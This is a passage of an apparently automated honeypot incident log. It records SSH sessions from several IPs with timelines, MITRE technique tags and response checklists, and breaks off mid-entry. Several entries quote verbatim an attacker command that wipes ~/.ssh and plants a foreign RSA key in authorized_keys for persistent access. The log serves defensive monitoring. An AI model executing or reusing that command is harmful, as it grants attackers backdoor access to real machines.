| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:08:07` | `cowrie.session.connect` |
| `2026-07-03 21:08:07` | `cowrie.client.version` |
| `2026-07-03 21:08:07` | `cowrie.client.kex` |
| `2026-07-03 21:08:08` | `cowrie.login.success` |
| `2026-07-03 21:08:09` | `cowrie.session.params` |
| `2026-07-03 21:08:09` | `cowrie.command.input` |
| `2026-07-03 21:08:09` | `cowrie.command.failed` |
| `2026-07-03 21:08:09` | `cowrie.log.closed` |
| `2026-07-03 21:08:10` | `cowrie.session.params` |
| `2026-07-03 21:08:10` | `cowrie.command.input` |
| `2026-07-03 21:08:10` | `cowrie.session.file_download` |
| `2026-07-03 21:08:10` | `cowrie.log.closed` |
| `2026-07-03 21:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.250[.]9` to AbuseIPDB if not already reported
- [ ] Block `207.154.250[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a844bc8a1652

| Field | Detail |
|---|---|
| **Source IP** | `207.154.250[.]9` |
| **First Seen** | 2026-07-03 21:08 |
| **Last Seen** | 2026-07-03 21:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:08:10` | `cowrie.session.connect` |
| `2026-07-03 21:08:10` | `cowrie.client.version` |
| `2026-07-03 21:08:10` | `cowrie.client.kex` |
| `2026-07-03 21:08:10` | `cowrie.login.success` |
| `2026-07-03 21:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.250[.]9` to AbuseIPDB if not already reported
- [ ] Block `207.154.250[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f4fd4e89e05

| Field | Detail |
|---|---|
| **Source IP** | `207.154.250[.]9` |
| **First Seen** | 2026-07-03 21:08 |
| **Last Seen** | 2026-07-03 21:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:08:10` | `cowrie.session.connect` |
| `2026-07-03 21:08:10` | `cowrie.client.version` |
| `2026-07-03 21:08:11` | `cowrie.client.kex` |
| `2026-07-03 21:08:11` | `cowrie.login.success` |
| `2026-07-03 21:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.250[.]9` to AbuseIPDB if not already reported
- [ ] Block `207.154.250[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-082d6eaf0b97

| Field | Detail |
|---|---|
| **Source IP** | `121.132.27[.]238` |
| **First Seen** | 2026-07-03 21:10 |
| **Last Seen** | 2026-07-03 21:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:10:49` | `cowrie.session.connect` |
| `2026-07-03 21:10:49` | `cowrie.client.version` |
| `2026-07-03 21:10:50` | `cowrie.client.kex` |
| `2026-07-03 21:10:50` | `cowrie.login.success` |
| `2026-07-03 21:10:51` | `cowrie.session.params` |
| `2026-07-03 21:10:51` | `cowrie.command.input` |
| `2026-07-03 21:10:51` | `cowrie.command.failed` |
| `2026-07-03 21:10:52` | `cowrie.log.closed` |
| `2026-07-03 21:10:53` | `cowrie.session.params` |
| `2026-07-03 21:10:53` | `cowrie.command.input` |
| `2026-07-03 21:10:53` | `cowrie.session.file_download` |
| `2026-07-03 21:10:53` | `cowrie.log.closed` |
| `2026-07-03 21:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.132.27[.]238` to AbuseIPDB if not already reported
- [ ] Block `121.132.27[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db18be796084

| Field | Detail |
|---|---|
| **Source IP** | `121.132.27[.]238` |
| **First Seen** | 2026-07-03 21:10 |
| **Last Seen** | 2026-07-03 21:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:10:53` | `cowrie.session.connect` |
| `2026-07-03 21:10:53` | `cowrie.client.version` |
| `2026-07-03 21:10:53` | `cowrie.client.kex` |
| `2026-07-03 21:10:54` | `cowrie.login.success` |
| `2026-07-03 21:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.132.27[.]238` to AbuseIPDB if not already reported
- [ ] Block `121.132.27[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e457369deb73

| Field | Detail |
|---|---|
| **Source IP** | `121.132.27[.]238` |
| **First Seen** | 2026-07-03 21:10 |
| **Last Seen** | 2026-07-03 21:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:10:55` | `cowrie.session.connect` |
| `2026-07-03 21:10:55` | `cowrie.client.version` |
| `2026-07-03 21:10:55` | `cowrie.client.kex` |
| `2026-07-03 21:10:56` | `cowrie.login.success` |
| `2026-07-03 21:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.132.27[.]238` to AbuseIPDB if not already reported
- [ ] Block `121.132.27[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80186bcca604

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 21:18 |
| **Last Seen** | 2026-07-03 21:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:18:16` | `cowrie.session.connect` |
| `2026-07-03 21:18:18` | `cowrie.client.version` |
| `2026-07-03 21:18:18` | `cowrie.client.kex` |
| `2026-07-03 21:18:23` | `cowrie.login.success` |
| `2026-07-03 21:18:27` | `cowrie.session.params` |
| `2026-07-03 21:18:27` | `cowrie.command.input` |
| `2026-07-03 21:18:28` | `cowrie.log.closed` |
| `2026-07-03 21:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-656fcebbb3b0

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-03 21:23 |
| **Last Seen** | 2026-07-03 21:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:23:11` | `cowrie.session.connect` |
| `2026-07-03 21:23:11` | `cowrie.client.version` |
| `2026-07-03 21:23:11` | `cowrie.client.kex` |
| `2026-07-03 21:23:12` | `cowrie.login.success` |
| `2026-07-03 21:23:13` | `cowrie.session.params` |
| `2026-07-03 21:23:13` | `cowrie.command.input` |
| `2026-07-03 21:23:13` | `cowrie.command.failed` |
| `2026-07-03 21:23:14` | `cowrie.log.closed` |
| `2026-07-03 21:23:15` | `cowrie.session.params` |
| `2026-07-03 21:23:15` | `cowrie.command.input` |
| `2026-07-03 21:23:15` | `cowrie.session.file_download` |
| `2026-07-03 21:23:15` | `cowrie.log.closed` |
| `2026-07-03 21:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d64d2f1d038e

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-03 21:23 |
| **Last Seen** | 2026-07-03 21:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:23:15` | `cowrie.session.connect` |
| `2026-07-03 21:23:15` | `cowrie.client.version` |
| `2026-07-03 21:23:15` | `cowrie.client.kex` |
| `2026-07-03 21:23:16` | `cowrie.login.success` |
| `2026-07-03 21:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94dea94ff16b

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-03 21:23 |
| **Last Seen** | 2026-07-03 21:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:23:17` | `cowrie.session.connect` |
| `2026-07-03 21:23:17` | `cowrie.client.version` |
| `2026-07-03 21:23:17` | `cowrie.client.kex` |
| `2026-07-03 21:23:18` | `cowrie.login.success` |
| `2026-07-03 21:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e574b68ec4b8

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-07-03 21:23 |
| **Last Seen** | 2026-07-03 21:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:23:39` | `cowrie.session.connect` |
| `2026-07-03 21:23:39` | `cowrie.client.version` |
| `2026-07-03 21:23:39` | `cowrie.client.kex` |
| `2026-07-03 21:23:40` | `cowrie.login.success` |
| `2026-07-03 21:23:41` | `cowrie.session.params` |
| `2026-07-03 21:23:41` | `cowrie.command.input` |
| `2026-07-03 21:23:41` | `cowrie.command.failed` |
| `2026-07-03 21:23:41` | `cowrie.log.closed` |
| `2026-07-03 21:23:41` | `cowrie.session.params` |
| `2026-07-03 21:23:41` | `cowrie.command.input` |
| `2026-07-03 21:23:41` | `cowrie.session.file_download` |
| `2026-07-03 21:23:41` | `cowrie.log.closed` |
| `2026-07-03 21:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29baca4f3e51

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-07-03 21:23 |
| **Last Seen** | 2026-07-03 21:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:23:42` | `cowrie.session.connect` |
| `2026-07-03 21:23:42` | `cowrie.client.version` |
| `2026-07-03 21:23:42` | `cowrie.client.kex` |
| `2026-07-03 21:23:42` | `cowrie.login.success` |
| `2026-07-03 21:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e242b7b4dfc

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-07-03 21:23 |
| **Last Seen** | 2026-07-03 21:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:23:42` | `cowrie.session.connect` |
| `2026-07-03 21:23:42` | `cowrie.client.version` |
| `2026-07-03 21:23:43` | `cowrie.client.kex` |
| `2026-07-03 21:23:43` | `cowrie.login.success` |
| `2026-07-03 21:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6470508c4eda

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-07-03 21:23 |
| **Last Seen** | 2026-07-03 21:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:23:48` | `cowrie.session.connect` |
| `2026-07-03 21:23:48` | `cowrie.client.version` |
| `2026-07-03 21:23:48` | `cowrie.client.kex` |
| `2026-07-03 21:23:49` | `cowrie.login.success` |
| `2026-07-03 21:23:50` | `cowrie.session.params` |
| `2026-07-03 21:23:50` | `cowrie.command.input` |
| `2026-07-03 21:23:50` | `cowrie.command.failed` |
| `2026-07-03 21:23:51` | `cowrie.log.closed` |
| `2026-07-03 21:23:51` | `cowrie.session.params` |
| `2026-07-03 21:23:51` | `cowrie.command.input` |
| `2026-07-03 21:23:52` | `cowrie.session.file_download` |
| `2026-07-03 21:23:52` | `cowrie.log.closed` |
| `2026-07-03 21:23:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82567469f039

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-07-03 21:23 |
| **Last Seen** | 2026-07-03 21:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:23:52` | `cowrie.session.connect` |
| `2026-07-03 21:23:52` | `cowrie.client.version` |
| `2026-07-03 21:23:52` | `cowrie.client.kex` |
| `2026-07-03 21:23:53` | `cowrie.login.success` |
| `2026-07-03 21:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46f73bbdb6b6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]198` |
| **First Seen** | 2026-07-03 21:23 |
| **Last Seen** | 2026-07-03 21:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:23:53` | `cowrie.session.connect` |
| `2026-07-03 21:23:53` | `cowrie.client.version` |
| `2026-07-03 21:23:53` | `cowrie.client.kex` |
| `2026-07-03 21:23:54` | `cowrie.login.success` |
| `2026-07-03 21:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]198` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54c42e5ab329

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-07-03 21:23 |
| **Last Seen** | 2026-07-03 21:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:23:54` | `cowrie.session.connect` |
| `2026-07-03 21:23:54` | `cowrie.client.version` |
| `2026-07-03 21:23:54` | `cowrie.client.kex` |
| `2026-07-03 21:23:55` | `cowrie.login.success` |
| `2026-07-03 21:23:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-522797512d72

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 21:29 |
| **Last Seen** | 2026-07-03 21:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:29:53` | `cowrie.session.connect` |
| `2026-07-03 21:29:53` | `cowrie.client.version` |
| `2026-07-03 21:29:53` | `cowrie.client.kex` |
| `2026-07-03 21:29:54` | `cowrie.login.success` |
| `2026-07-03 21:29:55` | `cowrie.session.params` |
| `2026-07-03 21:29:55` | `cowrie.command.input` |
| `2026-07-03 21:29:55` | `cowrie.log.closed` |
| `2026-07-03 21:29:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0343bd710955

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 21:30 |
| **Last Seen** | 2026-07-03 21:30 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:30:05` | `cowrie.session.connect` |
| `2026-07-03 21:30:06` | `cowrie.client.version` |
| `2026-07-03 21:30:06` | `cowrie.client.kex` |
| `2026-07-03 21:30:12` | `cowrie.login.success` |
| `2026-07-03 21:30:16` | `cowrie.session.params` |
| `2026-07-03 21:30:16` | `cowrie.command.input` |
| `2026-07-03 21:30:18` | `cowrie.log.closed` |
| `2026-07-03 21:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e28c94741369

| Field | Detail |
|---|---|
| **Source IP** | `125.244.114[.]221` |
| **First Seen** | 2026-07-03 21:32 |
| **Last Seen** | 2026-07-03 21:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:32:22` | `cowrie.session.connect` |
| `2026-07-03 21:32:22` | `cowrie.client.version` |
| `2026-07-03 21:32:22` | `cowrie.client.kex` |
| `2026-07-03 21:32:23` | `cowrie.login.success` |
| `2026-07-03 21:32:24` | `cowrie.session.params` |
| `2026-07-03 21:32:24` | `cowrie.command.input` |
| `2026-07-03 21:32:24` | `cowrie.command.failed` |
| `2026-07-03 21:32:24` | `cowrie.log.closed` |
| `2026-07-03 21:32:25` | `cowrie.session.params` |
| `2026-07-03 21:32:25` | `cowrie.command.input` |
| `2026-07-03 21:32:25` | `cowrie.session.file_download` |
| `2026-07-03 21:32:25` | `cowrie.log.closed` |
| `2026-07-03 21:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.244.114[.]221` to AbuseIPDB if not already reported
- [ ] Block `125.244.114[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2079273e4499

| Field | Detail |
|---|---|
| **Source IP** | `125.244.114[.]221` |
| **First Seen** | 2026-07-03 21:32 |
| **Last Seen** | 2026-07-03 21:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 21:32:26` | `cowrie.session.connect` |
| `2026-07-03 21:32:26` | `cowrie.client.version` |
| `2026-07-03 21:32:26` | `cowrie.client.kex` |
| `2026-07-03 21:32:27` | `cowrie.login.success` |
| `2026-07-03 21:32:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.244.114[.]221` to AbuseIPDB if not already reported
- [ ] Block `125.244.114[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd674f2780fb

| Field | Detail |
|---|---|
| **Source IP** | `125.244.114[.]221` |
| **First Seen** | 2026-07-03 21:32 |
